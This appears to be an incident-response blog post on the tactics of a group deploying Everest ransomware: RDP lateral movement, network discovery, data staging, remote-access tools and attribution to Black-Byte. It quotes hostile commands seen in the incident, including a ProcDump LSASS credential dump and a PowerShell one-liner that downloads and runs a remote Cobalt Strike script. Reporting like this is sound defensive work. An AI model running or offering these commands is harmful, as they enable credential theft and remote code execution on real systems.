Summary
tl;dr
In the Threat Pulse released in November 2021 we touched on Everest Ransomware group.
This latest blog documents the TTPs employed by a group who were observed deploying
Everest ransomware during a recent incident response engagement.
In summary, we identified the following key TTPs:
Lateral Movement through Remote Desktop Protocol (RDP)
1/5

Gathering of internal IP addresses for hosts on the network
Local LSASS dumps
NTDS.dit dumps
Installation of Remote Access Tools for persistence

Everest Ransomware
Earlier reports [1] have linked Everest ransomware as part of the Everbe 2.0 family, which is
composed of Embrace, PainLocker, EvilLocker and Hyena Locker ransomware. However,
after recovering and analysing an Everest ransomware file, we assess with medium
confidence that Everest ransomware is related to Black-Byte.

Everest TTPs
Lateral Movement
The threat actor was observed using legitimate compromised user accounts and Remote
Desktop Protocol (RDP) for lateral movement.

Credential Access
ProcDump was used to create a copy of the LSASS process in order to access additional
credentials. The following command was observed being executed:
C:\Users\<Compromised User>\Desktop\procdump64.exe -ma lsass.exe C:\Users\
<Compromised User>\Desktop\lsass<victim’s domain name>.dmp , for example
lsasscontoso.dmp .

A copy of the NTDS database was also created with a file name of ntds.dit.zip.

Defence Evasion
Throughout the incident the threat actor routinely removed tooling, reconnaissance output
files and data collection archives from hosts.

Discovery
Network discovery was observed upon the compromise of a new host. This activity was
primarily conducted via the use of netscan.exe , netscanpack.exe and
SoftPerfectNetworkScannerPortable.exe . These tools allow network scans to identify
further hosts of interest as well as building a target list for ransomware deployment.
The output of these tools were saved as text files in the C:\Users\Public\Downloads\
directory. Examples of these have been included below:

2/5

C:\Users\Public\Downloads\subnets.txt
C:\Users\Public\Downloads\trustdumps.txt

Collection
The threat actor installed the WinRAR application on a file server which was then used to
archive data ready for exfiltration.

Command and Control
Cobalt Strike was the primary command and control mechanism used by the threat actor.
This was executed on hosts using the following command:
powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(<IP
Address>/a'))

Additionally, a Metasploit payload was identified within the path C:\Users\Public\l.exe .
The following Remote Access Tools were also deployed by the threat actor as a secondary
command and control method, in addition to added persistence with the tools being installed
as a service
AnyDesk
Splashtop Remote Desktop
Atera

Exfiltration
The threat actor utilised the file transfer capabilities of Splashtop to exfiltrate data out of the
network.

Impact
Everest’s action on objectives appears to focus on data exfiltration of sensitive information as
well as encryption, commonly referred to as double extortion.

Attribution
The recovered ransomware binary is attributed to (based on the ransomware note) the
‘Everest group’. However, after analysing it, we identified/attributed the sample to Black-Byte
(C# variant instead of Go). It should be noted that the sample’s compilation timestamp does
match the incident’s timeline.
Even though the sample’s functionality remains the same, we noticed that it does not
download the key from a server anymore. Instead, it is (randomly) generated on the
compromised host. In addition, the ransomware’s onion link is different.
Based on our findings, we cannot confirm if a different threat actor copied the source code of
Black-Byte and started using it or if the Black-Byte have indeed started using again the C#
ransomware variant.
